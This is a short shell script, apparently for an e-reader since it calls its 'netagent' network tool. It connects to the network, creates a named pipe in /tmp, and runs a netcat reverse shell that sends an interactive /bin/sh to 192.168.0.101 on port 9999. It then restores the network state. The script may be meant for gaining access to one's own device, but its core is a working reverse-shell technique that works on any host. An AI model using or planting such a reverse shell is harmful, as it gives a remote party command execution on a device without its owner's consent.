#!/bin/sh

# connect only to network if we're not already connected
mypid="$(ps |grep netagent|grep connect)"
if [[ "$mypid" == "" ]]; then 
	/ebrmain/bin/netagent connect
fi

myip=192.168.0.101

#create backpipe if it doesn't exist
if ls -l /tmp/|grep backpipe |grep ^p; then
	echo "debug: backpipe exist."
else
	mknod /tmp/backpipe p
fi

# the heart...
nc $myip 9999 0</tmp/backpipe|/bin/sh -i 2>&1 |tee -a /tmp/backpipe;


# disconnect only from network if we were not connected when script started.
if [[ "$mypid" == "" ]]; then 
	/ebrmain/bin/netagent disconnect
fi
